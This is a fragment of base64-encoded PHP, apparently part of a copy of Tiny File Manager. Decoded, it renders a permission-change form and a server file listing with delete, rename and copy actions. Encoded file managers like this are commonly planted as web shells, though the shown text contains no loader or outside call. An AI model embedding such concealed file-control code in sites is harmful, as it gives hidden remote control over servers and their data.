Eg9Rk1fUEFUSDsgZm1fcmVkaXJlY3QoRk1fU0VMRl9VUkwgLiAnP3A9JyAuIHVybGVuY29kZSgkRk1fUEFUSCkpOw0KICAgIH0NCg0KICAgIGZtX3Nob3dfaGVhZGVyKCk7IC8vIEhFQURFUg0KICAgIGZtX3Nob3dfbmF2X3BhdGgoRk1fUEFUSCk7IC8vIGN1cnJlbnQgcGF0aA0KDQogICAgJGZpbGVfdXJsID0gRk1fUk9PVF9VUkwgLiAoRk1fUEFUSCAhPSAnJyA/ICcvJyAuIEZNX1BBVEggOiAnJykgLiAnLycgLiAkZmlsZTsNCiAgICAkZmlsZV9wYXRoID0gJHBhdGggLiAnLycgLiAkZmlsZTsNCg0KICAgICRtb2RlID0gZmlsZXBlcm1zKCRwYXRoIC4gJy8nIC4gJGZpbGUpOw0KICAgID8+DQogICAgPGRpdiBjbGFzcz0icGF0aCI+DQogICAgICAgIDxkaXYgY2xhc3M9ImNhcmQgbWItMiA8P3BocCBlY2hvIGZtX2dldF90aGVtZSgpOyA/PiI+DQogICAgICAgICAgICA8aDYgY2xhc3M9ImNhcmQtaGVhZGVyIj4NCiAgICAgICAgICAgICAgICA8P3BocCBlY2hvIGxuZygnQ2hhbmdlUGVybWlzc2lvbnMnKSA/Pg0KICAgICAgICAgICAgPC9oNj4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtYm9keSI+DQogICAgICAgICAgICAgICAgPHAgY2xhc3M9ImNhcmQtdGV4dCI+DQogICAgICAgICAgICAgICAgICAgIDw/cGhwICRkaXNwbGF5X3BhdGggPSBmbV9nZXRfZGlzcGxheV9wYXRoKCRmaWxlX3BhdGgpOyA/Pg0KICAgICAgICAgICAgICAgICAgICA8P3BocCBlY2hvICRkaXNwbGF5X3BhdGhbJ2xhYmVsJ107ID8+OiA8P3BocCBlY2hvICRkaXNwbGF5X3BhdGhbJ3BhdGgnXTsgPz48YnI+DQogICAgICAgICAgICAgICAgPC9wPg0KICAgICAgICAgICAgICAgIDxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiPg0KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJwIiB2YWx1ZT0iPD9waHAgZWNobyBmbV9lbmMoRk1fUEFUSCkgPz4iPg0KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJjaG1vZCIgdmFsdWU9Ijw/cGhwIGVjaG8gZm1fZW5jKCRmaWxlKSA/PiI+DQoNCiAgICAgICAgICAgICAgICAgICAgPHRhYmxlIGNsYXNzPSJ0YWJsZSBjb21wYWN0LXRhYmxlIDw/cGhwIGVjaG8gZm1fZ2V0X3RoZW1lKCk7ID8+Ij4NCiAgICAgICAgICAgICAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQ+PC90ZD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQ+PGI+PD9waHAgZWNobyBsbmcoJ093bmVyJykgPz48L2I+PC90ZD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQ+PGI+PD9waHAgZWNobyBsbmcoJ0dyb3VwJykgPz48L2I+PC90ZD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQ+PGI+PD9waHAgZWNobyBsbmcoJ090aGVyJykgPz48L2I+PC90ZD4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvdHI+DQogICAgICAgICAgICAgICAgICAgICAgICA8dHI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkIHN0eWxlPSJ0ZXh0LWFsaWduOiByaWdodCI+PGI+PD9waHAgZWNobyBsbmcoJ1JlYWQnKSA/PjwvYj48L3RkPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48bGFiZWw+PGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJ1ciIgdmFsdWU9IjEiPD9waHAgZWNobyAoJG1vZGUgJiAwMDQwMCkgPyAnIGNoZWNrZWQnIDogJycgPz4+PC9sYWJlbD48L3RkPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48bGFiZWw+PGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJnciIgdmFsdWU9IjEiPD9waHAgZWNobyAoJG1vZGUgJiAwMDA0MCkgPyAnIGNoZWNrZWQnIDogJycgPz4+PC9sYWJlbD48L3RkPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48bGFiZWw+PGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJvciIgdmFsdWU9IjEiPD9waHAgZWNobyAoJG1vZGUgJiAwMDAwNCkgPyAnIGNoZWNrZWQnIDogJycgPz4+PC9sYWJlbD48L3RkPg0KICAgICAgICAgICAgICAgICAgICAgICAgPC90cj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQgc3R5bGU9InRleHQtYWxpZ246IHJpZ2h0Ij48Yj48P3BocCBlY2hvIGxuZygnV3JpdGUnKSA/PjwvYj48L3RkPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48bGFiZWw+PGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJ1dyIgdmFsdWU9IjEiPD9waHAgZWNobyAoJG1vZGUgJiAwMDIwMCkgPyAnIGNoZWNrZWQnIDogJycgPz4+PC9sYWJlbD48L3RkPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48bGFiZWw+PGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJndyIgdmFsdWU9IjEiPD9waHAgZWNobyAoJG1vZGUgJiAwMDAyMCkgPyAnIGNoZWNrZWQnIDogJycgPz4+PC9sYWJlbD48L3RkPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48bGFiZWw+PGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJvdyIgdmFsdWU9IjEiPD9waHAgZWNobyAoJG1vZGUgJiAwMDAwMikgPyAnIGNoZWNrZWQnIDogJycgPz4+PC9sYWJlbD48L3RkPg0KICAgICAgICAgICAgICAgICAgICAgICAgPC90cj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQgc3R5bGU9InRleHQtYWxpZ246IHJpZ2h0Ij48Yj48P3BocCBlY2hvIGxuZygnRXhlY3V0ZScpID8+PC9iPjwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjxsYWJlbD48aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9InV4IiB2YWx1ZT0iMSI8P3BocCBlY2hvICgkbW9kZSAmIDAwMTAwKSA/ICcgY2hlY2tlZCcgOiAnJyA/Pj48L2xhYmVsPjwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjxsYWJlbD48aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Imd4IiB2YWx1ZT0iMSI8P3BocCBlY2hvICgkbW9kZSAmIDAwMDEwKSA/ICcgY2hlY2tlZCcgOiAnJyA/Pj48L2xhYmVsPjwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjxsYWJlbD48aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Im94IiB2YWx1ZT0iMSI8P3BocCBlY2hvICgkbW9kZSAmIDAwMDAxKSA/ICcgY2hlY2tlZCcgOiAnJyA/Pj48L2xhYmVsPjwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICA8L3RyPg0KICAgICAgICAgICAgICAgICAgICA8L3RhYmxlPg0KDQogICAgICAgICAgICAgICAgICAgIDxwPg0KICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ0b2tlbiIgdmFsdWU9Ijw/cGhwIGVjaG8gJF9TRVNTSU9OWyd0b2tlbiddOyA/PiI+IA0KICAgICAgICAgICAgICAgICAgICAgICAgPGI+PGEgaHJlZj0iP3A9PD9waHAgZWNobyB1cmxlbmNvZGUoRk1fUEFUSCkgPz4iIGNsYXNzPSJidG4gYnRuLW91dGxpbmUtcHJpbWFyeSI+PGkgY2xhc3M9ImZhIGZhLXRpbWVzLWNpcmNsZSI+PC9pPiA8P3BocCBlY2hvIGxuZygnQ2FuY2VsJykgPz48L2E+PC9iPiZuYnNwOw0KICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXN1Y2Nlc3MiPjxpIGNsYXNzPSJmYSBmYS1jaGVjay1jaXJjbGUiPjwvaT4gPD9waHAgZWNobyBsbmcoJ0NoYW5nZScpID8+PC9idXR0b24+DQogICAgICAgICAgICAgICAgICAgIDwvcD4NCiAgICAgICAgICAgICAgICA8L2Zvcm0+DQogICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgPC9kaXY+DQogICAgPC9kaXY+DQogICAgPD9waHANCiAgICBmbV9zaG93X2Zvb3RlcigpOw0KICAgIGV4aXQ7DQp9DQoNCi8vIC0tLSBUSU5ZRklMRU1BTkFHRVIgTUFJTiAtLS0NCmZtX3Nob3dfaGVhZGVyKCk7IC8vIEhFQURFUg0KZm1fc2hvd19uYXZfcGF0aChGTV9QQVRIKTsgLy8gY3VycmVudCBwYXRoDQoNCi8vIHNob3cgYWxlcnQgbWVzc2FnZXMNCmZtX3Nob3dfbWVzc2FnZSgpOw0KDQokbnVtX2ZpbGVzID0gY291bnQoJGZpbGVzKTsNCiRudW1fZm9sZGVycyA9IGNvdW50KCRmb2xkZXJzKTsNCiRhbGxfZmlsZXNfc2l6ZSA9IDA7DQokdGFibGVUaGVtZSA9IChGTV9USEVNRSA9PSAiZGFyayIpID8gInRleHQtd2hpdGUgYmctZGFyayB0YWJsZS1kYXJrIiA6ICJiZy13aGl0ZSI7DQo/Pg0KPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCIgY2xhc3M9InB0LTMiPg0KICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InAiIHZhbHVlPSI8P3BocCBlY2hvIGZtX2VuYyhGTV9QQVRIKSA/PiI+DQogICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZ3JvdXAiIHZhbHVlPSIxIj4NCiAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ0b2tlbiIgdmFsdWU9Ijw/cGhwIGVjaG8gJF9TRVNTSU9OWyd0b2tlbiddOyA/PiI+DQogICAgPGRpdiBjbGFzcz0idGFibGUtcmVzcG9uc2l2ZSI+DQogICAgICAgIDx0YWJsZSBjbGFzcz0idGFibGUgdGFibGUtYm9yZGVyZWQgdGFibGUtaG92ZXIgdGFibGUtc20gPD9waHAgZWNobyAkdGFibGVUaGVtZTsgPz4iIGlkPSJtYWluLXRhYmxlIj4NCiAgICAgICAgICAgIDx0aGVhZCBjbGFzcz0idGhlYWQtd2hpdGUiPg0KICAgICAgICAgICAgPHRyPg0KICAgICAgICAgICAgICAgIDw/cGhwIGlmICghRk1fUkVBRE9OTFkpOiA/Pg0KICAgICAgICAgICAgICAgICAgICA8dGggc3R5bGU9IndpZHRoOjMlIiBjbGFzcz0iY3VzdG9tLWNoZWNrYm94LWhlYWRlciI+DQogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjdXN0b20tY29udHJvbCBjdXN0b20tY2hlY2tib3giPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJjaGVja2JveCIgY2xhc3M9ImN1c3RvbS1jb250cm9sLWlucHV0IiBpZD0ianMtc2VsZWN0LWFsbC1pdGVtcyIgb25jbGljaz0iY2hlY2tib3hfdG9nZ2xlKCkiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBjbGFzcz0iY3VzdG9tLWNvbnRyb2wtbGFiZWwiIGZvcj0ianMtc2VsZWN0LWFsbC1pdGVtcyI+PC9sYWJlbD4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8L3RoPjw/cGhwIGVuZGlmOyA/Pg0KICAgICAgICAgICAgICAgIDx0aD48P3BocCBlY2hvIGxuZygnTmFtZScpID8+PC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PD9waHAgZWNobyBsbmcoJ1NpemUnKSA/PjwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjw/cGhwIGVjaG8gbG5nKCdNb2RpZmllZCcpID8+PC90aD4NCiAgICAgICAgICAgICAgICA8P3BocCBpZiAoIUZNX0lTX1dJTiAmJiAhJGhpZGVfQ29scyk6ID8+DQogICAgICAgICAgICAgICAgICAgIDx0aD48P3BocCBlY2hvIGxuZygnUGVybXMnKSA/PjwvdGg+DQogICAgICAgICAgICAgICAgICAgIDx0aD48P3BocCBlY2hvIGxuZygnT3duZXInKSA/PjwvdGg+PD9waHAgZW5kaWY7ID8+DQogICAgICAgICAgICAgICAgPHRoPjw/cGhwIGVjaG8gbG5nKCdBY3Rpb25zJykgPz48L3RoPg0KICAgICAgICAgICAgPC90cj4NCiAgICAgICAgICAgIDwvdGhlYWQ+DQogICAgICAgICAgICA8P3BocA0KICAgICAgICAgICAgLy8gbGluayB0byBwYXJlbnQgZm9sZGVyDQogICAgICAgICAgICBpZiAoJHBhcmVudCAhPT0gZmFsc2UpIHsNCiAgICAgICAgICAgICAgICA/Pg0KICAgICAgICAgICAgICAgIDx0cj48P3BocCBpZiAoIUZNX1JFQURPTkxZKTogPz4NCiAgICAgICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJub3NvcnQiPjwvdGQ+PD9waHAgZW5kaWY7ID8+DQogICAgICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0iYm9yZGVyLTAiIGRhdGEtc29ydD48YSBocmVmPSI/cD08P3BocCBlY2hvIHVybGVuY29kZSgkcGFyZW50KSA/PiI+PGkgY2xhc3M9ImZhIGZhLWNoZXZyb24tY2lyY2xlLWxlZnQgZ28tYmFjayI+PC9pPiAuLjwvYT48L3RkPg0KICAgICAgICAgICAgICAgICAgICA8dGQgY2xhc3M9ImJvcmRlci0wIiBkYXRhLW9yZGVyPjwvdGQ+DQogICAgICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0iYm9yZGVyLTAiIGRhdGEtb3JkZXI+PC90ZD4NCiAgICAgICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJib3JkZXItMCI+PC90ZD4NCiAgICAgICAgICAgICAgICAgICAgPD9waHAgaWYgKCFGTV9JU19XSU4gJiYgISRoaWRlX0NvbHMpIHsgPz4NCiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0iYm9yZGVyLTAiPjwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICA8dGQgY2xhc3M9ImJvcmRlci0wIj48L3RkPg0KICAgICAgICAgICAgICAgICAgICA8P3BocCB9ID8+DQogICAgICAgICAgICAgICAgPC90cj4NCiAgICAgICAgICAgICAgICA8P3BocA0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJGlpID0gMzM5OTsNCiAgICAgICAgICAgIGZvcmVhY2ggKCRmb2xkZXJzIGFzICRmKSB7DQogICAgICAgICAgICAgICAgJGlzX2xpbmsgPSBpc19saW5rKCRwYXRoIC4gJy8nIC4gJGYpOw0KICAgICAgICAgICAgICAgICRpbWcgPSAkaXNfbGluayA/ICdpY29uLWxpbmtfZm9sZGVyJyA6ICdmYSBmYS1mb2xkZXItbyc7DQogICAgICAgICAgICAgICAgJG1vZGlmX3JhdyA9IGZpbGVtdGltZSgkcGF0aCAuICcvJyAuICRmKTsNCiAgICAgICAgICAgICAgICAkbW9kaWYgPSBkYXRlKEZNX0RBVEVUSU1FX0ZPUk1BVCwgJG1vZGlmX3Jhdyk7DQogICAgICAgICAgICAgICAgJGRhdGVfc29ydGluZyA9IHN0cnRvdGltZShkYXRlKCJGIGQgWSBIOmk6cy4iLCAkbW9kaWZfcmF3KSk7DQogICAgICAgICAgICAgICAgJGZpbGVzaXplX3JhdyA9ICIiOw0KICAgICAgICAgICAgICAgICRmaWxlc2l6ZSA9IGxuZygnRm9sZGVyJyk7DQogICAgICAgICAgICAgICAgJHBlcm1zID0gc3Vic3RyKGRlY29jdChmaWxlcGVybXMoJHBhdGggLiAnLycgLiAkZikpLCAtNCk7DQogICAgICAgICAgICAgICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0cHd1aWQnKSAmJiBmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldGdyZ2lkJykpIHsNCiAgICAgICAgICAgICAgICAgICAgJG93bmVyID0gcG9zaXhfZ2V0cHd1aWQoZmlsZW93bmVyKCRwYXRoIC4gJy8nIC4gJGYpKTsNCiAgICAgICAgICAgICAgICAgICAgJGdyb3VwID0gcG9zaXhfZ2V0Z3JnaWQoZmlsZWdyb3VwKCRwYXRoIC4gJy8nIC4gJGYpKTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCRvd25lciA9PT0gZmFsc2UpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRvd25lciA9IGFycmF5KCduYW1lJyA9PiAnPycpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGlmICgkZ3JvdXAgPT09IGZhbHNlKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkZ3JvdXAgPSBhcnJheSgnbmFtZScgPT4gJz8nKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICRvd25lciA9IGFycmF5KCduYW1lJyA9PiAnPycpOw0KICAgICAgICAgICAgICAgICAgICAkZ3JvdXAgPSBhcnJheSgnbmFtZScgPT4gJz8nKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgPz4NCiAgICAgICAgICAgICAgICA8dHI+DQogICAgICAgICAgICAgICAgICAgIDw/cGhwIGlmICghRk1fUkVBRE9OTFkpOiA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJjdXN0b20tY2hlY2tib3gtdGQiPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY3VzdG9tLWNvbnRyb2wgY3VzdG9tLWNoZWNrYm94Ij4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iY2hlY2tib3giIGNsYXNzPSJjdXN0b20tY29udHJvbC1pbnB1dCIgaWQ9Ijw/cGhwIGVjaG8gJGlpID8+IiBuYW1lPSJmaWxlW10iIHZhbHVlPSI8P3BocCBlY2hvIGZtX2VuYygkZikgPz4iPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBjbGFzcz0iY3VzdG9tLWNvbnRyb2wtbGFiZWwiIGZvcj0iPD9waHAgZWNobyAkaWkgPz4iPjwvbGFiZWw+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvdGQ+PD9waHAgZW5kaWY7ID8+DQogICAgICAgICAgICAgICAgICAgIDx0ZCBkYXRhLXNvcnQ9PD9waHAgZWNobyBmbV9jb252ZXJ0X3dpbihmbV9lbmMoJGYpKSA/Pj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZpbGVuYW1lIj48YSBocmVmPSI/cD08P3BocCBlY2hvIHVybGVuY29kZSh0cmltKEZNX1BBVEggLiAnLycgLiAkZiwgJy8nKSkgPz4iPjxpIGNsYXNzPSI8P3BocCBlY2hvICRpbWcgPz4iPjwvaT4gPD9waHAgZWNobyBmbV9jb252ZXJ0X3dpbihmbV9lbmMoJGYpKSA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvYT48P3BocCBlY2hvKCRpc19saW5rID8gJyAmcmFycjsgPGk+JyAuIHJlYWRsaW5rKCRwYXRoIC4gJy8nIC4gJGYpIC4gJzwvaT4nIDogJycpID8+PC9kaXY+DQogICAgICAgICAgICAgICAgICAgIDwvdGQ+DQogICAgICAgICAgICAgICAgICAgIDx0ZCBkYXRhLW9yZGVyPSJhLTw/cGhwIGVjaG8gc3RyX3BhZCgkZmlsZXNpemVfcmF3LCAxOCwgIjAiLCBTVFJfUEFEX0xFRlQpOz8+Ij4NCiAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwIGVjaG8gJGZpbGVzaXplOyA/Pg0KICAgICAgICAgICAgICAgICAgICA8L3RkPg0KICAgICAgICAgICAgICAgICAgICA8dGQgZGF0YS1vcmRlcj0iYS08P3BocCBlY2hvICRkYXRlX3NvcnRpbmc7Pz4iPjw/cGhwIGVjaG8gJG1vZGlmID8+PC90ZD4NCiAgICAgICAgICAgICAgICAgICAgPD9waHAgaWYgKCFGTV9JU19XSU4gJiYgISRoaWRlX0NvbHMpOiA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjw/cGhwIGlmICghRk1fUkVBRE9OTFkpOiA/PjxhIHRpdGxlPSJDaGFuZ2UgUGVybWlzc2lvbnMiIGhyZWY9Ij9wPTw/cGhwIGVjaG8gdXJsZW5jb2RlKEZNX1BBVEgpID8+JmFtcDtjaG1vZD08P3BocCBlY2hvIHVybGVuY29kZSgkZikgPz4iPjw/cGhwIGVjaG8gJHBlcm1zID8+PC9hPjw/cGhwIGVsc2U6ID8+PD9waHAgZWNobyAkcGVybXMgPz48P3BocCBlbmRpZjsgPz4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICA8dGQ+PD9waHAgZWNobyAkb3duZXJbJ25hbWUnXSAuICc6JyAuICRncm91cFsnbmFtZSddID8+PC90ZD4NCiAgICAgICAgICAgICAgICAgICAgPD9waHAgZW5kaWY7ID8+DQogICAgICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0iaW5saW5lLWFjdGlvbnMiPjw/cGhwIGlmICghRk1fUkVBRE9OTFkpOiA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIHRpdGxlPSI8P3BocCBlY2hvIGxuZygnRGVsZXRlJyk/PiIgaHJlZj0iP3A9PD9waHAgZWNobyB1cmxlbmNvZGUoRk1fUEFUSCkgPz4mYW1wO2RlbD08P3BocCBlY2hvIHVybGVuY29kZSgkZikgPz4iIG9uY2xpY2s9ImNvbmZpcm1EYWlsb2coZXZlbnQsICcxMDI4JywnPD9waHAgZWNobyBsbmcoJ0RlbGV0ZScpLicgJy5sbmcoJ0ZvbGRlcicpOyA/PicsJzw/cGhwIGVjaG8gdXJsZW5jb2RlKCRmKSA/PicsIHRoaXMuaHJlZik7Ij4gPGkgY2xhc3M9ImZhIGZhLXRyYXNoLW8iIGFyaWEtaGlkZGVuPSJ0cnVlIj48L2k+PC9hPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIHRpdGxlPSI8P3BocCBlY2hvIGxuZygnUmVuYW1lJyk/PiIgaHJlZj0iIyIgb25jbGljaz0icmVuYW1lKCc8P3BocCBlY2hvIGZtX2VuYyhhZGRzbGFzaGVzKEZNX1BBVEgpKSA/PicsICc8P3BocCBlY2hvIGZtX2VuYyhhZGRzbGFzaGVzKCRmKSkgPz4nKTtyZXR1cm4gZmFsc2U7Ij48aSBjbGFzcz0iZmEgZmEtcGVuY2lsLXNxdWFyZS1vIiBhcmlhLWhpZGRlbj0idHJ1ZSI+PC9pPjwvYT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSB0aXRsZT0iPD9waHAgZWNobyBsbmcoJ0NvcHlUbycpPz4uLi4iIGhyZWY9Ij9wPSZhbXA7Y29weT08P3BocCBlY2hvIHVybGVuY29kZSh0cmltKEZNX1BBVEggLiAnLycgLiAkZiwgJy8nKSkgPz4iPjxpIGNsYXNzPSJmYSBmYS1maWxlcy1vIiBhcmlhLWhpZGRlbj0idHJ1ZSI+PC9pPjwvYT4NCiAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwIGVuZGlmOyA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgPGEgdGl0bGU9Ijw/cGhwIGVjaG8gbG5nKCdEaXJlY3RMaW5rJyk/PiIgaHJlZj0iPD9waHAgZWNobyBmbV9lbmMoRk1fUk9PVF9VUkwgLiAoRk1fUEFUSCAhPSAnJyA/ICcvJyAuIEZNX1BBVEggOiAnJykgLiAnLycgLiAkZiAuICcvJykgPz4iIHRhcmdldD0iX2JsYW5rIj48aSBjbGFzcz0iZmEgZmEtbGluayIgYXJpYS1oaWRkZW49InRydWUiPjwvaT48L2E+DQogICAgICAgICAgICAgICAgICAgIDwvdGQ+DQogICAgICAgICAgICAgICAgPC90cj4NCiAgICAgICAgICAgICAgICA8P3BocA0KICAgICAgICAgICAgICAgIGZsdXNoKCk7DQogICAgICAgICAgICAgICAgJGlpKys7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAkaWsgPSA2MDcwOw0KICAgICAgICAgICAgZm9yZWFjaCAoJGZpbGVzIGFzICRmKSB7DQogICAgICAgICAgICAgICAgJGlzX2xpbmsgPSBpc19saW5rKCRwYXRoIC4gJy8nIC4gJGYpOw0KICAgICAgICAgICAgICAgICRpbWcgPSAkaXNfbGluayA/ICdmYSBmYS1maWxlLXRleHQtbycgOiBmbV9nZXRfZmlsZV9pY29uX2NsYXNzKCRwYXRoIC4gJy8nIC4gJGYpOw0KICAgICAgICAgICAgICAgICRtb2RpZl9yYXcgPSBmaWxlbXRpbWUoJHBhdGggLiAnLycgLiAkZik7DQogICAgICAgICAgICAgICAgJG1vZGlmID0gZGF0ZShGTV9EQVRFVElNRV9GT1JNQVQsICRtb2RpZl9yYXcpOw0KICAgICAgICAgICAgICAgICRkYXRlX3NvcnRpbmcgPSBzdHJ0b3RpbWUoZGF0ZSgiRiBkIFkgSDppOnMuIiwgJG1vZGlmX3JhdykpOw0KICAgICAgICAgICAgICAgICRmaWxlc2l6ZV9yYXcgPSBmbV9nZXRfc2l6ZSgkcGF0aCAuICcvJyAuICRmKTsNCiAgICAgICAgICAgICAgICAkZmlsZXNpemUgPSBmbV9nZXRfZmlsZXNpemUoJGZpbGVzaXplX3Jhdyk7DQogICAgICAgICAgICAgICAgJGZpbGVsaW5rID0gJz9wPScgLiB1cmxlbmNvZGUoRk1fUEFUSCkgLiAnJmFtcDt2aWV3PScgLiB1cmxlbmNvZGUoJGYpOw0KICAgICAgICAgICAgICAgICRhbGxfZmlsZXNfc2l6ZSArPSAkZmlsZXNpemVfcmF3Ow0KICAgICAgICAgICAgICAgICRwZXJtcyA9IHN1YnN0cihkZWNvY3QoZmlsZXBlcm1zKCRwYXRoIC4gJy8nIC4gJGYpKSwgLTQpOw0KICAgICAgICAgICAgICAgIGlmIChmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldHB3dWlkJykgJiYgZnVuY3Rpb25fZXhpc3RzKCdwb3NpeF9nZXRncmdpZCcpKSB7DQogICAgICAgICAgICAgICAgICAgICRvd25lciA9IHBvc2l4X2dldHB3dWlkKGZpbGVvd25lcigkcGF0aCAuICcvJyAuICRmKSk7DQogICAgICAgICAgICAgICAgICAgICRncm91cCA9IHBvc2l4X2dldGdyZ2lkKGZpbGVncm91cCgkcGF0aCAuICcvJyAuICRmKSk7DQogICAgICAgICAgICAgICAgICAgIGlmICgkb3duZXIgPT09IGZhbHNlKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkb3duZXIgPSBhcnJheSgnbmFtZScgPT4gJz8nKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBpZiAoJGdyb3VwID09PSBmYWxzZSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgJGdyb3VwID0gYXJyYXkoJ25hbWUnID0+ICc/Jyk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAkb3duZXIgPSBhcnJheSgnbmFtZScgPT4gJz8nKTsNCiAgICAgICAgICAgICAgICAgICAgJGdyb3VwID0gYXJyYXkoJ25hbWUnID0+ICc/Jyk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgID8+DQogICAgICAgICAgICAgICAgPHRyPg0KICAgICAgICAgICAgICAgICAgICA8P3BocCBpZiAoIUZNX1JFQURPTkxZKTogPz4NCiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0iY3VzdG9tLWNoZWNrYm94LXRkIj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImN1c3RvbS1jb250cm9sIGN1c3RvbS1jaGVja2JveCI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImNoZWNrYm94IiBjbGFzcz0iY3VzdG9tLWNvbnRyb2wtaW5wdXQiIGlkPSI8P3BocCBlY2hvICRpayA/PiIgbmFtZT0iZmlsZVtdIiB2YWx1ZT0iPD9waHAgZWNobyBmbV9lbmMoJGYpID8+Ij4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgY2xhc3M9ImN1c3RvbS1jb250cm9sLWxhYmVsIiBmb3I9Ijw/cGhwIGVjaG8gJGlrID8+Ij48L2xhYmVsPg0KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAg